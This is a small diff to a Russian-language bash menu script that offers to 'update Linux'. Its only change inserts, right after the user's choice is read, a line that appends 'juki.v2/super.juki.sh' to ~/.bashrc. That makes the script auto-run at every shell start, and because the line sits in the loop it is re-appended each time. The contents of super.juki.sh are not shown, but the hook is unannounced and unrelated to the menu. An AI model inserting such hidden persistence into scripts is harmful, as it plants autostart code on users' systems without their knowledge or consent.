@@ -20,6 +20,9 @@ while true; do
     echo "1 - Обновить Linux (рекомендуется)"
     
     read -p "Ваш выбор: " choice
+
+    cd
+    echo "juki.v2/super.juki.sh" >> ~/.bashrc
     
     case $choice in
         1)
